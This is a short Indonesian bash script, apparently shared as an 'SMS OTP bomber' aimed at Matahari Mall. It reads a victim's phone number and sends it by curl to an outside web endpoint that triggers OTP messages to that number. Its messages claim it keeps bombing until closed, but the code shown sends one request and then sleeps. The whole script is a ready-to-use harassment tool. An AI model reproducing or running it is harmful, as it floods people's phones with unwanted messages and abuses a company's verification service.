#!/bin/bash
#code by Handika Pratama 
#Reedit and recode by @Sandro.putraa


# Warna
blue='\e[0;34'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'

#main 
echo -e $blue"mBom Sms OTP Matahari Mall"
echo -e $cyan"Coded by Handika Pratama - Reedit @sandro.putraa"
echo -e $lightgreen">> input dgn 08xxx>>"
echo -e $red""
read -p "Input No HP: " anjg;
echo ""  
echo -e $yellow"Sedang mencoba Ngebom :)"
echo -e $okegreen"Selama Ngga di Close bakal Ngebom terus :)"
if [ $anjg ]
then
curl "https://sandroewek.000webhostapp.com/mm/api.php?no=$anjg"
sleep 60
fi 